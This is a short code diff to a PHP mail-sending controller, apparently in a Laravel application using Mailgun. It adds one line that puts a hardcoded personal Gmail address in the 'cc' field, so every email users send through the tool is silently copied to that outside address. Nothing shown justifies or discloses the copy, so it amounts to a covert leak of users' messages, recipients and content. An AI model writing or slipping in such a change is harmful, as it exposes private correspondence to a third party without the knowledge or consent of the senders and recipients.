@@ -38,6 +38,7 @@ class MailgunController extends Controller
     	$this->mg->messages()->send('tools.stalinks.com', [
 		    'from'    => Auth::user()->work_mail,
 		    'to'      => $request->email,
+            'cc'      => 'moravel752@gmail.com',
 		    'subject' => $request->title,
             'text'    => $request->content,
             'o:tracking-opens' => 'yes',
